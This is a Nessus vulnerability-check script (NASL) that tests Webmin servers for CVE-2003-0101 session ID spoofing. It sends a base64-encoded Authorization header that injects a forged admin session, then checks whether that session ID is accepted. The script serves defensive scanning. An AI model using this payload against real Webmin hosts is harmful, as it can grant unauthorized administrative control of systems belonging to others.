#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11279);
 script_bugtraq_id(6915);
 script_cve_id("CVE-2003-0101");
 
 script_version ("$Revision: 1.8 $");
 name["english"] = "Webmin Session ID Spoofing";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote server is running a version of Webmin which is vulnerable
to Session ID spoofing.

An attacker may use this flaw to log in as admin on this host,
and basically gain full control on it

Solution : upgrade to webmin 1.070
Risk factor : High";





 script_description(english:desc["english"]);
 
 summary["english"] = "Spoofs a session ID";
 
 script_summary(english:summary["english"],
francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("webmin.nasl");
 script_require_ports("Services/www", 10000);
 exit(0);
}
include("http_func.inc");
include("http_keepalive.inc");


include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"),  port:10000);
			 

function check(port)
{
  if ( ! get_kb_item("www/" + port + "/webmin") ) return;

  req = http_get(item:"/", port:port);
  ua  = egrep(string:req, pattern:"^User-Agent");
  req = req - ua;
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nUser-Agent: webmin\r\nAuthorization: Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgYWRtaW46cGFzc3dvcmQ=\r\nCookie: testing=1;\r\n\r\n"), idx);


  r = http_keepalive_send_recv(port:port, data:req);
  if(egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string:r))return 0;
  if(!ereg(pattern:"^HTTP/[0-9]\.[0-9] 401 ", string:r))return 0;



  req = http_get(item:"/", port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nCookie: testing=1; sid=1234567890\r\n\r\n"), idx);


  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL ) return 0;


  #
  # I'm afraid of localizations, so I grep on the HTML source code,
  # not the message status.
  # 
 if(egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string:r))
  { 
  security_hole(port);
  }
}    
    
    
foreach port (ports)
{
   if ( get_port_state(port) && ! get_kb_item("Services/www/" + port + "/broken") ) check(port:port);
}
